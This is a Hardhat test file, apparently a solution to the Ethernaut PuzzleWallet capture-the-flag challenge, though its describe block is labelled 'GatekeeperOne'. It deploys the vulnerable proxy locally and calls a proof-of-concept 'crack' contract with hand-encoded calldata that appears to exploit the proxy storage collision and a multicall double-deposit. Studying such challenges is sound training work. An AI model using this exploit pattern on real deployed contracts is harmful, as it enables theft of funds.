import { ethers } from "hardhat";

describe("GatekeeperOne", function () {
  async function deploy() {
    const [owner, otherAccount] = await ethers.getSigners();

    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
    const PuzzleWalletPOC = await ethers.getContractFactory("PuzzleWalletPOC");
    const logic = await PuzzleWallet.deploy();
    const initData = PuzzleWallet.interface.encodeFunctionData("init", [owner.address]);
    const wallet = await PuzzleProxy.deploy(owner.address, logic.address, initData);
    const poc = await PuzzleWalletPOC.deploy();

    await PuzzleWallet.attach(wallet.address).addToWhitelist(owner.address);
    await PuzzleWallet.attach(wallet.address).deposit({ value: ethers.utils.parseEther("0.001") });

    return { wallet, poc, owner, otherAccount };
  }

  describe("Crack", function () {
    it("bingo", async function () {
      const { wallet, poc, otherAccount } = await deploy();
      console.log("wallet address: ", wallet.address);
      await poc.connect(otherAccount).crack(wallet.address, "0x9d51d9b7000000000000000000000000dadada681e6270e1d0181442220a2e5608b11d21", "0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000", {
        value: ethers.utils.parseEther("0.001"),
      });
    });
  });

});
